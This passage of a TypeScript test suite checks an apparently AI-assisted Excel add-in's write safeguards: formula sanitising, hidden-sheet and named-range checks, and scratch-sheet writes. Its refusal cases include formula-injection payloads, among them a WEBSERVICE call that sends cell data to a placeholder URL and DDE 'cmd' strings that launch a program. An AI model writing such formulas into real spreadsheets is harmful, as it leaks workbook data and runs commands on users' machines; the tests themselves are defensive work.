import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
import type { ExcelRun } from "../../src/office/highlight";
import { EXCEL_OP_TIMEOUT_MS } from "../../src/office/highlight";
import { MAX_FORMULA_CHARS } from "../../src/copilot/rules";
import type { CopilotLimits, WriteProposal } from "../../src/copilot/types";
import {
  EXCEL_CELL_CHARS, RESERVED_SHEETS, WRITE_SETTLE_MS, referencedSheets, SCRATCH_MARK, SCRATCH_SHEET, WRITE_MESSAGES as M, WRITE_WARNINGS, applyWrite, isReservedSheet,
  previewWrite, safeFormula, safeValue, type ApplyOptions, type WritePreview,
} from "../../src/copilot/write";
import { createWriteFake, type FakeWriteSheet, type WriteFakeOptions } from "../support/copilot-write-fake";

const corpus = JSON.parse(readFileSync(resolve(process.cwd(), "../tests/fixtures/copilot/formula_corpus.json"), "utf-8")) as { deny: string[]; allow: string[] };

const LIMITS: CopilotLimits = { max_cells_per_call: 2000, max_cells_per_session: 20000, max_steps_per_turn: 8, max_write_cells: 2000, cell_char_limit: 500 };
const lim = (over: Partial<CopilotLimits>): CopilotLimits => ({ ...LIMITS, ...over });
const SENTINEL = "SENTINEL-raw-office-text-7f3a";

type Fake = ReturnType<typeof createWriteFake>;
function setup(sheets: FakeWriteSheet[] = [{ name: "Data" }]) {
  const f = createWriteFake(sheets);
  return { f, run: f.run as unknown as ExcelRun };
}
const vals = (sheet: string, range: string, values: WriteProposal["values"]): WriteProposal => ({ sheet, range, values, note: "" });
const fmls = (sheet: string, range: string, formulas: string[][]): WriteProposal => ({ sheet, range, formulas, note: "" });

async function preview(run: ExcelRun, p: WriteProposal, target: "scratch" | "range" = "range", limits = LIMITS): Promise<WritePreview> {
  const res = await previewWrite(run, p, limits, target);
  if (!res.ok) throw new Error(`preview refused: ${res.error}`);
  return res.preview;
}
async function previewError(run: ExcelRun, p: WriteProposal, target: "scratch" | "range" = "range", limits = LIMITS): Promise<string> {
  const res = await previewWrite(run, p, limits, target);
  expect(res.ok).toBe(false);
  return (res as { error: string }).error;
}
/** A range preview for a sheet that cannot be previewed (hidden, reserved, ...), with the proposal's real after/afterStamp. */
async function forged(p: WriteProposal, sheetId = ""): Promise<WritePreview> {
  const pv = await preview(setup([]).run, p, "scratch");
  return { ...pv, target: "range", sheet: p.sheet, sheetId, before: [[""]], stamp: "" };
}
/** Scratch options, confirmed by default (formulas need it; values ignore it). */
const scratch = (extra: Partial<Extract<ApplyOptions, { target: "scratch" }>> = {}): ApplyOptions => ({ target: "scratch", limits: LIMITS, confirmed: true, ...extra });
const confirmed = (pv: WritePreview, extra: Partial<Extract<ApplyOptions, { target: "range" }>> = {}): ApplyOptions => ({ target: "range", confirmed: true, preview: pv, limits: LIMITS, ...extra });
const writesIn = (f: Fake) => f.log.filter((l) => /^(set |write |call |add |name |activate|select|protect|unprotect|delete)/.test(l));
const touched = (f: Fake) => f.log.filter((l) => l.startsWith("range ")).map((l) => l.slice(6));

const officeWith = (merged: boolean) => ({ context: { requirements: { isSetSupported: (set: string, v: string) => set === "ExcelApi" && (merged || v !== "1.13") } } });
/** Warnings every range preview carries (merged-cell detection supported). */
const RANGE_ALWAYS = [WRITE_WARNINGS.tables, WRITE_WARNINGS.undo];

beforeEach(() => {
  vi.stubGlobal("Office", officeWith(true));
});

afterEach(() => {
  vi.useRealTimers();
  vi.unstubAllGlobals();
});

describe("safeValue: port of schemas.py _safe_value (tests/unit/copilot/test_schemas.py)", () => {
  test.each([
    '=WEBSERVICE("http://x/"&A1)', "+cmd|' /c calc'!A0", "@SUM(1)", "-1+1", "- 5", " =1+1", "\t=1", "\r1", "\t1", "\u200b=1", "\xa0@x", "\n=1",
    "-", "+3.5x", "\uff1d1+1", "\uff0bcmd|x", "\uff20SUM(1)", "\uff0dx", "\u2212x", "\u22125", "-1e",
    // JS-side additions: NFKC expansion, other whitespace and invisible prefixes
    "\u2a75x", "\u3000=1", "\ufeff=1", "\u2060+x", "\u00ad@x", "\u2003-x", "=SUM(A1)",
  ])("refuses %j", (bad) => {
    expect(() => safeValue(bad)).toThrow(M.formulaLike);
  });

  test.each(["-5", "+3.5", "-0.25", " -5 ", "5", "abc", "a=b", "x-1", ".5", "-.5", "5.", "-1e20", "-1e3", "+2.5E-7", ""])("allows %j", (ok) => {
    expect(safeValue(ok)).toBe(ok);
  });

  test("numbers, booleans and null pass; hidden characters are stripped", () => {
    expect([-5, 2.5, null, true, "ok"].map(safeValue)).toEqual([-5, 2.5, null, true, "ok"]);
    expect(safeValue("a\u200bb")).toBe("ab");
  });

  test("non-scalars and non-finite numbers are refused", () => {
    for (const bad of [[1], { a: 1 }, undefined, NaN, Infinity, () => 1]) expect(() => safeValue(bad)).toThrow(M.badCell);
  });

  test("text over Excel's cell limit is refused, at the limit it passes", () => {
    expect(safeValue("a".repeat(EXCEL_CELL_CHARS))).toHaveLength(EXCEL_CELL_CHARS);
    expect(() => safeValue("a".repeat(EXCEL_CELL_CHARS + 1))).toThrow(M.tooLong);
    expect(() => safeValue("😀".repeat(EXCEL_CELL_CHARS - 10))).toThrow(M.tooLong); // UTF-16 units
    expect(() => safeValue("😀".repeat(16384))).toThrow(M.tooLong); // 32768 units
    expect(safeValue("😀".repeat(16383) + "a")).toHaveLength(EXCEL_CELL_CHARS); // 32767 units
    expect(safeValue("a".repeat(EXCEL_CELL_CHARS) + "\u200b")).toHaveLength(EXCEL_CELL_CHARS); // hidden characters are stripped first
    expect(() => safeValue("a".repeat(5 * EXCEL_CELL_CHARS))).toThrow(M.tooLong);
  });
});

describe("safeFormula", () => {
  test.each(["1+1", " =1", "=", '=WEBSERVICE("x")', '=HYPERLINK("x")', "=cmd|'/c calc'!A1", "=" + "1".repeat(MAX_FORMULA_CHARS)])("refuses %j", (bad) => {
    expect(() => safeFormula(bad)).toThrow(M.badFormula);
  });
  test("refuses non-strings", () => {
    expect(() => safeFormula(1)).toThrow(M.badFormula);
  });
  test("allows ordinary formulas", () => {
    expect(safeFormula("=SUM(B1:B2)")).toBe("=SUM(B1:B2)");
    expect(safeFormula("=1")).toBe("=1");
  });
});

describe("referencedSheets", () => {
  test.each([
    ["=Secret!A1", ["Secret"]],
    ["='Secret'!A1:C10", ["Secret"]],
    ["='My Sheet'!A1+Data!B2", ["My Sheet", "Data"]],
    ["='It''s'!A1", ["It's"]],
    ["=SUM(Jan:Mar!A1)", ["Jan", "Mar"]],
    ["=SUM('Jan 1:Mar 1'!A1)", ["Jan 1", "Mar 1"]],
    ["=Sheet_2.x!A1*2", ["Sheet_2.x"]],
    ['="Secret!A1"&A1', []],
    ["=SUM(A1:B2)", []],
    ["=Table1[Col]", []],
    ["=Données!A1", ["Données"]],
  ])("%j -> %j", (f, names) => {
    expect(referencedSheets(f)).toEqual(names);
  });
});

describe("reserved names", () => {
  test("case-insensitive, including the Review sheet", () => {
    expect(RESERVED_SHEETS).toEqual(["onboarding review", "copilot scratch"]);
    for (const n of ["Onboarding Review", "onboarding review", "ONBOARDING REVIEW", "Copilot Scratch", "COPILOT SCRATCH", "copilot scratch", "cOpIlOt ScRaTcH"]) expect(isReservedSheet(n)).toBe(true);
    for (const n of ["Data", "Copilot Scratch 2", " Copilot Scratch"]) expect(isReservedSheet(n)).toBe(false);
  });
});

describe("previewWrite", () => {
  test("range target: before is the current text of exactly the target range, after is the proposal", async () => {
    const { f, run } = setup([
      { name: "Data", cells: [["a", 1, true], ["x", { f: "=A1&B1" }, null], ["outside"]] },
      { name: "Other", cells: [["secret"]] },
    ]);
    const pv = await preview(run, vals("Data", "a1:b2", [["new", 2], [null, false]]));
    expect(pv).toMatchObject({ target: "range", sheet: "Data", range: "A1:B2", rows: 2, cols: 2, cells: 4, kind: "values" });
    expect(pv.before).toEqual([["a", "1"], ["x", "=A1&B1"]]);
    expect(pv.after).toEqual([["new", "2"], ["", "FALSE"]]);
    expect(pv.warnings).toEqual([WRITE_WARNINGS.overwrite(4), WRITE_WARNINGS.formatChanges(1), ...RANGE_ALWAYS]);
    expect(pv.formatChanges).toBe(1); // "new" into a General cell becomes "@"
    expect(pv.overwrites).toBe(4);
    expect(pv.stamp).not.toBe("");
    expect(pv.sheetId).toBe(f.sheetId("Data"));
    expect(touched(f)).toEqual(["Data!A1:B2"]);
    expect(writesIn(f)).toEqual([]);
    expect(f.log.some((l) => l.includes("Other"))).toBe(false);
  });

  test("the diff reflects the sheet at preview time", async () => {
    const { f, run } = setup([{ name: "Data", cells: [["old"]] }]);
    const p = vals("Data", "A1", [["new"]]);
    expect((await preview(run, p)).before).toEqual([["old"]]);
    f.edit("Data", "A1", "changed");
    expect((await preview(run, p)).before).toEqual([["changed"]]);
  });

  test("before and after are shortened to cell_char_limit with a warning", async () => {
    const { run } = setup([{ name: "Data", cells: [["b".repeat(50)]] }]);
    const pv = await preview(run, vals("Data", "A1", [["a".repeat(50)]]), "range", lim({ cell_char_limit: 10 }));
    expect(pv.before).toEqual(["b".repeat(10) + "…"].map((s) => [s]));
    expect(pv.after).toEqual([["a".repeat(10) + "…"]]);
    expect(pv.warnings).toContain(WRITE_WARNINGS.shortened);
  });

  test("an empty target has no overwrite warning", async () => {
    const { run } = setup();
    expect((await preview(run, vals("Data", "C3", [[1]]))).warnings).toEqual(RANGE_ALWAYS);
  });

  test("formulas: shown with their =, and text-formatted target cells are warned about", async () => {
    const { run } = setup([{ name: "Data", formats: { A1: "@" } }]);
    const pv = await preview(run, fmls("Data", "A1:B1", [["=1+1", "=SUM(C1:C2)"]]));
    expect(pv.kind).toBe("formulas");
    expect(pv.after).toEqual([["=1+1", "=SUM(C1:C2)"]]);
    expect(pv.warnings).toEqual([WRITE_WARNINGS.textFormatted(1), ...RANGE_ALWAYS]);
    expect(pv.formatChanges).toBe(0); // formulas never change a user's formats
  });

  test("scratch target without a scratch sheet: nothing is read or written, before is []", async () => {
    const { f, run } = setup([{ name: "Data", cells: [["user"]] }]);
    const pv = await preview(run, vals("Data", "B2:C2", [["a", 1]]), "scratch");
    expect(pv).toMatchObject({ target: "scratch", sheet: SCRATCH_SHEET, sheetId: "", overwrites: 0, range: "B2:C2", before: [], after: [["a", "1"]], warnings: [WRITE_WARNINGS.undoScratch], stamp: "" });
    expect(touched(f)).toEqual([]);
    expect(writesIn(f)).toEqual([]);
    const long = await preview(run, vals("Data", "A1", [["a".repeat(20)]]), "scratch", lim({ cell_char_limit: 5 }));
    expect(long.warnings).toEqual([WRITE_WARNINGS.shortened, WRITE_WARNINGS.undoScratch]);
  });

  test("scratch target: content already on the owned scratch sheet at the range is counted", async () => {
    const { f, run } = setup([{ name: SCRATCH_SHEET, names: [SCRATCH_MARK], cells: [["old", null], [null, 2]] }]);
    const pv = await preview(run, vals("Data", "A1:B2", [["a", 1], [2, "b"]]), "scratch");
    expect(pv.warnings).toEqual([WRITE_WARNINGS.scratchOverwrite(2), WRITE_WARNINGS.undoScratch]);
    expect(pv.overwrites).toBe(2);
    expect(pv.before).toEqual([]);
    expect(touched(f)).toEqual([`${SCRATCH_SHEET}!A1:B2`]);
    expect(writesIn(f)).toEqual([]);
  });

  test("scratch target: a same-named sheet the add-in did not create is refused without reading it", async () => {
    const { f, run } = setup([{ name: "COPILOT SCRATCH", cells: [["user"]] }]);
    expect(await previewError(run, vals("Data", "A1", [[1]]), "scratch")).toBe(M.conflict);
    expect(touched(f)).toEqual([]);
  });

  test("every range preview warns that Excel can't undo the change, and about tables/spills/validation", async () => {
    const { run } = setup([{ name: "Data", cells: [["x"]] }]);
    for (const p of [vals("Data", "A1", [["y"]]), fmls("Data", "B1", [["=1"]])]) {
      const pv = await preview(run, p);
      expect(pv.warnings).toContain("Excel can't undo this change (Office.js writes clear Excel's undo history).");
      expect(pv.warnings).toContain("Tables, spilled arrays and data validation may be affected; check the result.");
    }
  });

  test("number-format changes on user cells are counted and disclosed", async () => {
    const { run } = setup([{ name: "Data", formats: { A1: "0.00", B1: "@" } }]);
    const changing = await preview(run, vals("Data", "A1:B1", [["x", 12]])); // A1 0.00 -> @, B1 @ -> General
    expect(changing.formatChanges).toBe(2);
    expect(changing.warnings).toContain(WRITE_WARNINGS.formatChanges(2));
    const keeping = await preview(run, vals("Data", "A1:B1", [[5, "y"]])); // 0.00 kept for 5, "@" kept for "y"
    expect(keeping.formatChanges).toBe(0);
    expect(keeping.warnings.some((w) => w.includes("number format"))).toBe(false);
  });

  test("merged cells in the target are refused; outside the target they are fine", async () => {
    const { f, run } = setup([{ name: "Data", merged: ["B2:C2"] }]);
    expect(await previewError(run, vals("Data", "A1:B2", [[1, 2], [3, 4]]))).toBe(M.merged);
    expect(touched(f).every((a) => a === "Data!A1:B2")).toBe(true);
    expect((await preview(run, vals("Data", "A1", [[1]]))).warnings).not.toContain(WRITE_WARNINGS.mergedUnknown);
  });

  test("without ExcelApi 1.13 merged cells can't be detected: a warning, not a refusal", async () => {
    vi.stubGlobal("Office", officeWith(false));
    const { f, run } = setup([{ name: "Data", merged: ["A1:B1"] }]);
    expect((await preview(run, vals("Data", "A1", [[1]]))).warnings).toContain(WRITE_WARNINGS.mergedUnknown);
    expect(f.log.some((l) => l.startsWith("merged "))).toBe(false);
  });

  test("a failing merged-cell check fails closed", async () => {
    const { f, run } = setup([{ name: "Data" }]);
    f.failSync(3, Object.assign(new Error(SENTINEL), { code: "GeneralException" })); // 1 lookup, 2 writable, 3 merged
    expect(await previewError(run, vals("Data", "A1", [[1]]))).toBe(M.merged);
  });

  test("the proposal is validated again (defence in depth)", async () => {
    const { f, run } = setup();
    const cases: [WriteProposal, string][] = [
      [vals("Data", "A1:B2", [[1, 2]]), M.shape],
      [vals("Data", "A1:B2", [[1, 2], [3]]), M.shape],
      [vals("Data", "A1:A2", [[1], 2] as never), M.shape],
      [vals("Data", "A1", [1] as never), M.shape],
      [vals("Data", "A1", [[{ a: 1 }]] as never), M.badCell],
      [vals("Data", "A1", [[[1]]] as never), M.badCell],
      [vals("Data", "A:A", [[1]]), M.badRange],
      [vals("Data", "1:1", [[1]]), M.badRange],
      [vals("Data", "Data!A1", [[1]]), M.badRange],
      [vals("Data", "A0", [[1]]), M.badRange],
      [vals("Data", 5 as never, [[1]]), M.badRange],
      [vals("Da[ta", "A1", [[1]]), M.badSheet],
      [vals("History", "A1", [[1]]), M.badSheet],
      [vals("", "A1", [[1]]), M.badSheet],
      [{ sheet: "Data", range: "A1", note: "" }, M.oneOf],
      [{ sheet: "Data", range: "A1", values: [[1]], formulas: [["=1"]], note: "" }, M.oneOf],
      [vals("Data", "A1", [["=SUM(A1)"]]), M.formulaLike],
      [fmls("Data", "A1", [['=WEBSERVICE("x")']]), M.badFormula],
      [null as never, M.oneOf],
      // Sparse arrays (holes) are shape errors, never skipped cells.
      [vals("Data", "A1:B1", (() => { const r: number[] = [1]; r.length = 2; return [r]; })()), M.shape],
      [vals("Data", "A1:A2", (() => { const a: unknown[] = [[1]]; a.length = 2; return a; })() as never), M.shape],
      [fmls("Data", "A1:B1", (() => { const r: string[] = ["=1"]; r.length = 2; return [r]; })()), M.shape],
    ];
    for (const [p, err] of cases) {
      expect(await previewError(run, p)).toBe(err);
      expect(await previewError(run, p, "scratch")).toBe(err);
    }
    expect(f.runs()).toBe(0);
  });

  test("the cell cap is checked before the payload is walked", async () => {
    const { f, run } = setup();
    expect(await previewError(run, vals("Data", "A1:B2", [[1, 2], [3, 4]]), "range", lim({ max_write_cells: 3 }))).toBe(M.tooMany);
    expect((await preview(run, vals("Data", "A1:C1", [[1, 2, 3]]), "range", lim({ max_write_cells: 3 }))).cells).toBe(3);
    // A huge range with a tiny payload is refused by size, not by shape
    expect(await previewError(run, vals("Data", "A1:XFD1048576", [[1]]))).toBe(M.tooMany);
    expect(f.log.filter((l) => l.startsWith("range "))).toEqual(["range Data!A1:C1"]);
  });

  test("bad limits and targets are refused", async () => {
    const { run } = setup();
    for (const bad of [null, {}, lim({ max_write_cells: 0 }), lim({ cell_char_limit: 1.5 })]) {
      expect(await previewError(run, vals("Data", "A1", [[1]]), "range", bad as CopilotLimits)).toBe(M.badLimits);
    }
    expect(await previewError(run, vals("Data", "A1", [[1]]), "elsewhere" as never)).toBe(M.badTarget);
  });

  test.each(["Onboarding Review", "onboarding review", "COPILOT SCRATCH", "Copilot Scratch", "copilot scratch"])("range target refuses the reserved sheet %j", async (name) => {
    const { f, run } = setup([{ name: "Copilot Scratch", names: [SCRATCH_MARK] }, { name: "Onboarding Review" }]);
    expect(await previewError(run, vals(name, "A1", [[1]]))).toBe(M.reserved);
    expect(f.runs()).toBe(0);
  });

  test("hidden, very hidden, protected and missing sheets are refused before any cell is read", async () => {
    const { f, run } = setup([
      { name: "Hid", visibility: "Hidden", cells: [["secret"]] },
      { name: "Very", visibility: "VeryHidden", cells: [["secret"]] },
      { name: "Locked", protected: true, cells: [["x"]] },
    ]);
    expect(await previewError(run, vals("Hid", "A1", [[1]]))).toBe(M.hidden);
    expect(await previewError(run, vals("Very", "A1", [[1]]))).toBe(M.hidden);
    expect(await previewError(run, vals("Locked", "A1", [[1]]))).toBe(M.protected);
    expect(await previewError(run, vals("Nope", "A1", [[1]]))).toBe(M.notFound);
    expect(touched(f)).toEqual([]);
  });

  test("the add-in's sheets are refused even when Excel resolves another spelling to them", async () => {
    // Excel's case-insensitive matching may be broader than the client fold; the resolved name is checked again.
    const f = createWriteFake([{ name: "Copilot Scratch", names: [SCRATCH_MARK] }], { aliases: { "Copilot Scratch\u0130": "Copilot Scratch" } });
    const run = f.run as unknown as ExcelRun;
    const p = vals("Copilot Scratch\u0130", "A1", [[1]]);
    expect(isReservedSheet(p.sheet)).toBe(false);
    expect(await previewWrite(run, p, LIMITS)).toEqual({ ok: false, error: M.reserved });
    expect(await applyWrite(run, p, confirmed(await forged(p, f.sheetId("Copilot Scratch"))))).toEqual({ ok: false, error: M.reserved, written: 0 });
    expect(touched(f)).toEqual([]);
  });

  test("an Excel failure is a fixed message without Office's text", async () => {
    const { f, run } = setup();
    f.failSync(1, Object.assign(new Error(SENTINEL), { code: "GeneralException" }));
    const res = await previewWrite(run, vals("Data", "A1", [[1]]), LIMITS);
    expect(res).toEqual({ ok: false, error: M.readFailed });
    expect(JSON.stringify(res)).not.toContain(SENTINEL);
  });

  test("busy Excel times out with the busy message", async () => {
    vi.useFakeTimers();
    const { f, run } = setup();
    const release = f.hold();
    const pending = previewWrite(run, vals("Data", "A1", [[1]]), LIMITS);
    await vi.advanceTimersByTimeAsync(EXCEL_OP_TIMEOUT_MS + 1);
    expect(await pending).toEqual({ ok: false, error: M.busy });
    release();
    await vi.runAllTimersAsync();
  });
});

describe("formula corpus (shared with the server) through preview and apply", () => {
  test("corpus loaded", () => {
    expect(corpus.deny.length).toBeGreaterThan(50);
    expect(corpus.allow.length).toBeGreaterThan(30);
  });

  test.each(corpus.deny)("denies %j", async (bad) => {
    const { f, run } = setup();
    const p = fmls("Data", "A1", [[bad]]);
    expect(await previewError(run, p, "scratch")).toBe(M.badFormula);
    expect(await applyWrite(run, p, scratch())).toEqual({ ok: false, error: M.badFormula, written: 0 });
    expect(f.runs()).toBe(0);
  });

  test.each(corpus.allow.filter((a) => a.startsWith("=") && [...a].length >= 2))("allows %j", async (ok) => {
    const { f, run } = setup();
    const p = fmls("Data", "A1", [[ok]]);
    expect((await preview(run, p, "scratch")).kind).toBe("formulas");
    expect(await applyWrite(run, p, scratch())).toMatchObject({ ok: true });
    expect(f.cell(SCRATCH_SHEET, "A1")).toEqual({ f: ok });
  });
});

describe("formulas referring to hidden sheets", () => {
  const book = (): FakeWriteSheet[] => [
    { name: "Data" },
    { name: "Secret", visibility: "VeryHidden", cells: [["salary"]] },
    { name: "Hid den", visibility: "Hidden" },
    { name: "Shown" },
  ];
  test.each(["=Secret!A1", "='Secret'!A1:C10", "=SUM(secret!A1)", "=1+'Hid den'!B2", "=SUM(Shown:Secret!A1)", "=SECRET!A1&Shown!A1"])("refuses %j on both targets", async (formula) => {
    const { f, run } = setup(book());
    const p = fmls("Data", "A1", [[formula]]);
    expect(await previewError(run, p)).toBe(M.hiddenRef);
    expect(await previewError(run, p, "scratch")).toBe(M.hiddenRef);
    expect(await applyWrite(run, p, scratch())).toEqual({ ok: false, error: M.hiddenRef, written: 0 });
    expect(await applyWrite(run, p, confirmed(await forged(p, f.sheetId("Data"))))).toEqual({ ok: false, error: M.hiddenRef, written: 0 });
    expect(writesIn(f)).toEqual([]);
    expect(touched(f)).toEqual([]);
  });

  test.each(["=Shown!A1", "=Unknown!A1", '="Secret!A1"', "=SUM(A1:A3)"])("allows %j", async (formula) => {
    const { f, run } = setup(book());
    expect(await applyWrite(run, fmls("Data", "A1", [[formula]]), scratch())).toMatchObject({ ok: true });
    expect(f.cell(SCRATCH_SHEET, "A1")).toEqual({ f: formula });
  });

  test("too many distinct sheet names are refused before Excel", async () => {
    const { f, run } = setup();
    const formula = "=" + Array.from({ length: 101 }, (_, i) => `S${i}!A1`).join("+");
    expect(await applyWrite(run, fmls("Data", "A1", [[formula]]), scratch())).toEqual({ ok: false, error: M.badFormula, written: 0 });
    expect(f.runs()).toBe(0);
  });
});

describe("formulas reaching hidden sheets through 3-D references, names and tables (re-resolved at apply)", () => {
  const sheets = (): FakeWriteSheet[] => [
    { name: "Data" },
    { name: "Jan" },
    { name: "Secret", visibility: "VeryHidden" },
    { name: "Mar" },
    { name: "Shown", scopedNames: { LocalSecret: "=Secret!$C$3", LocalOk: "=Shown!$A$1" } },
  ];
  const names = {
    SecretRate: "=Secret!$A$1", Rate: "=Data!$B$1", Chain: "=SecretRate*2", Ghost: "=Nope!$A$1", Loop1: "=Loop2", Loop2: "=Loop1",
    Bad: '=WEBSERVICE("x")', Const: "=0.05", Spill: "=Jan:Mar!$A$1", OkSpan: "=Data:Jan!$A$1",
  };
  const tables = [{ name: "Salaries", sheet: "Secret" }, { name: "Sales", sheet: "Data" }];
  const book = (extra: Partial<WriteFakeOptions> = {}) => {
    const f = createWriteFake(sheets(), { names, tables, ...extra });
    return { f, run: f.run as unknown as ExcelRun };
  };
  async function refused(formula: string, error: string, extra: Partial<WriteFakeOptions> = {}) {
    const { f, run } = book(extra);
    const p = fmls("Data", "A1", [[formula]]);
    expect(await previewError(run, p)).toBe(error);
    expect(await previewError(run, p, "scratch")).toBe(error);
    expect(await applyWrite(run, p, scratch())).toEqual({ ok: false, error, written: 0 });
    expect(await applyWrite(run, p, confirmed(await forged(p, f.sheetId("Data"))))).toEqual({ ok: false, error, written: 0 });
    expect(writesIn(f)).toEqual([]);
    expect(touched(f)).toEqual([]);
    expect(JSON.stringify(f.log)).not.toContain("SENTINEL-fake-office-text\"");
  }
  async function allowed(formula: string, extra: Partial<WriteFakeOptions> = {}) {
    const { f, run } = book(extra);
    const p = fmls("Data", "A1", [[formula]]);
    const pv = await preview(run, p);
    expect(await applyWrite(run, p, confirmed(pv))).toMatchObject({ ok: true });
    expect(f.cell("Data", "A1")).toEqual({ f: formula });
    return pv;
  }

  test.each(["=SUM(Jan:Mar!A1)", "=SUM(Mar:Jan!A1)", "=SUM(Data:Shown!B2)", "=SUM(jan:MAR!A1:B2)"])("3-D across a hidden sheet: %j", async (f) => {
    await refused(f, M.hiddenRef);
  });
  test.each(["=SUM(Data:Jan!A1)", "=SUM(Jan:Nope!A1)", "=SUM(Mar:Shown!A1)"])("3-D over visible sheets or to an unknown end: %j", async (f) => {
    await allowed(f);
  });
  test.each(["=SUM('Jan:Mar'!A1)", "=SUM('Data:Jan'!A1)", "=SUM('Sheet 1:Secret'!A1)"])("quoted 3-D references are already refused by the shared denylist: %j", async (formula) => {
    const { f, run } = book();
    const p = fmls("Data", "A1", [[formula]]);
    expect(await previewError(run, p)).toBe(M.badFormula);
    expect(await applyWrite(run, p, scratch())).toEqual({ ok: false, error: M.badFormula, written: 0 });
    expect(f.runs()).toBe(0);
  });
  test("3-D order comes from sheet positions, not the order Excel lists them", async () => {
    const f = createWriteFake([{ name: "Data" }, { name: "Jan" }, { name: "Mar" }, { name: "Secret", visibility: "VeryHidden" }], { rotateItems: true });
    const run = f.run as unknown as ExcelRun;
    expect(await applyWrite(run, fmls("Data", "A1", [["=SUM(Data:Jan!A1)"]]), scratch())).toMatchObject({ ok: true });
    expect(await applyWrite(run, fmls("Data", "A1", [["=SUM(Data:Secret!A1)"]]), scratch())).toMatchObject({ ok: false, error: M.hiddenRef });
  });
  test("a table on a sheet that can't be found counts as hidden", async () => {
    await refused("=SUM(Gone[X])", M.hiddenRef, { tables: [{ name: "Gone", sheet: "Vanished" }] });
  });
  test("3-D uses the workbook's sheet order", async () => {
    // Moving Secret out of the span (by order) makes Jan:Mar safe.
    const f = createWriteFake([{ name: "Data" }, { name: "Jan" }, { name: "Mar" }, { name: "Secret", visibility: "VeryHidden" }]);
    const run = f.run as unknown as ExcelRun;
    expect(await applyWrite(run, fmls("Data", "A1", [["=SUM(Jan:Mar!A1)"]]), scratch())).toMatchObject({ ok: true });
  });

  test.each(["=SecretRate*2", "=secretrate", "=Chain", "=Ghost", "=Loop1", "=Spill", "=Shown!LocalSecret", "=LocalSecret+1", "=MAP(A1:A2,LAMBDA(x,x*SecretRate))"])(
    "a defined name that reaches a hidden sheet (or can't be resolved): %j", async (f) => {
      await refused(f, M.hiddenName);
    },
  );
  test("a defined name whose formula is denied is refused like the function itself", async () => {
    await refused("=Bad+1", M.badFormula);
  });
  test.each(["=Rate*2", "=Const", '="SecretRate"&A1', "=OkSpan", "=Shown!LocalOk", "=SUM(A1:A2)", "=Data!A1", "=LET(x,1,x+Rate)"])("names on visible sheets: %j", async (f) => {
    await allowed(f);
  });

  test.each(["=SUM(Salaries[Amount])", "=ROWS(Salaries)", "=SUM(salaries[[#All],[Amount]])", "=COUNTA(Salaries[#Data])"])("a table on a hidden sheet: %j", async (f) => {
    await refused(f, M.hiddenRef);
  });
  test.each(["=SUM(Sales[Amount])", "=ROWS(Sales)", "=[@Amount]*2", '="Salaries[Amount]"'])("tables on visible sheets: %j", async (f) => {
    await allowed(f);
  });

  test("names that can't be loaded: a warning, and formulas using any name-like identifier are refused", async () => {
    for (const f of ["=Rate*2", "=LET(x,1,x)", "=Shown!LocalOk", "=Whatever"]) await refused(f, M.unchecked, { namesFail: true });
    const pv = await allowed("=SUM(A1:A3)+Data!B2+SUM(A:A)+SUM(1:2)+TRUE+_xlfn.XLOOKUP(1,A1:A2,B1:B2)+SUM(Sales[Amount])", { namesFail: true });
    expect(pv.warnings).toContain(WRITE_WARNINGS.unchecked);
  });

  test("tables that can't be loaded: a warning, and any structured reference is refused", async () => {
    for (const f of ["=SUM(Sales[Amount])", "=[@Amount]*2"]) await refused(f, M.unchecked, { tablesFail: true });
    const pv = await allowed("=SUM(A1:A3)*Rate", { tablesFail: true });
    expect(pv.warnings).toContain(WRITE_WARNINGS.unchecked);
  });

  test("everything loads: no warning; values proposals never load the workbook's names", async () => {
    expect((await allowed("=Rate")).warnings).not.toContain(WRITE_WARNINGS.unchecked);
    const { f, run } = book();
    await preview(run, vals("Data", "A1", [["x"]]));
    expect(f.log.some((l) => l.startsWith("load worksheets") || l.startsWith("load workbook names") || l.startsWith("load tables"))).toBe(false);
  });

  test("re-resolved at apply: a sheet hidden after the preview is refused", async () => {
    const f = createWriteFake([{ name: "Data" }, { name: "Lookup" }], { names: { Rate: "=Lookup!$A$1" }, tables: [{ name: "T", sheet: "Lookup" }] });
    const run = f.run as unknown as ExcelRun;
    for (const [formula, err] of [["=Lookup!A1", M.hiddenRef], ["=Rate", M.hiddenName], ["=SUM(T[X])", M.hiddenRef]] as const) {
      f.setVisibility("Lookup", "Visible");
      const p = fmls("Data", "A1", [[formula]]);
      const pv = await preview(run, p);
      f.setVisibility("Lookup", "Hidden");
      expect(await applyWrite(run, p, confirmed(pv))).toEqual({ ok: false, error: err, written: 0 });
      expect(await applyWrite(run, p, scratch())).toEqual({ ok: false, error: err, written: 0 });
    }
    expect(writesIn(f)).toEqual([]);
  });
});

describe("applyWrite to the scratch sheet", () => {
  test("formulas need explicit confirmation even on the scratch sheet; values stay one click", async () => {
    const { f, run } = setup();
    const p = fmls("Data", "A1:B1", [["=1+1", "=A1"]]);
    expect(await applyWrite(run, p, { target: "scratch", limits: LIMITS })).toEqual({ ok: false, error: M.confirm, written: 0 });
    expect(await applyWrite(run, p, scratch({ confirmed: false }))).toEqual({ ok: false, error: M.confirm, written: 0 });
    expect(writesIn(f)).toEqual([]);
    expect(f.sheetNames()).toEqual(["Data"]);
    expect(await applyWrite(run, p, scratch({ confirmed: true }))).toMatchObject({ ok: true, cells: 2 });
    expect(await applyWrite(run, vals("Data", "C1", [["x"]]), { target: "scratch", limits: LIMITS })).toMatchObject({ ok: true });
  });

  test("creates the sheet with a hidden ownership marker and writes at the proposal's range", async () => {
    const { f, run } = setup();
    const res = await applyWrite(run, vals("Data", "B2:C3", [["a", 1], [true, null]]), scratch());
    expect(res).toEqual({ ok: true, sheet: SCRATCH_SHEET, range: "B2:C3", cells: 4 });
    expect(f.sheetNames()).toEqual(["Data", SCRATCH_SHEET]);
    expect(f.hasName(SCRATCH_SHEET, SCRATCH_MARK)).toBe(true);
    expect(f.nameHidden(SCRATCH_SHEET, SCRATCH_MARK)).toBe(true);
    expect(f.cell(SCRATCH_SHEET, "B2")).toBe("a");
    expect(f.cell(SCRATCH_SHEET, "C2")).toBe(1);
    expect(f.cell(SCRATCH_SHEET, "B3")).toBe(true);
    expect(f.cell(SCRATCH_SHEET, "C3")).toBeUndefined();
    expect(f.cell("Data", "B2")).toBeUndefined();
    // Nothing on the user's sheet is touched; nothing is formatted, protected, activated or selected.
    expect(f.log.some((l) => l.includes("Data"))).toBe(false);
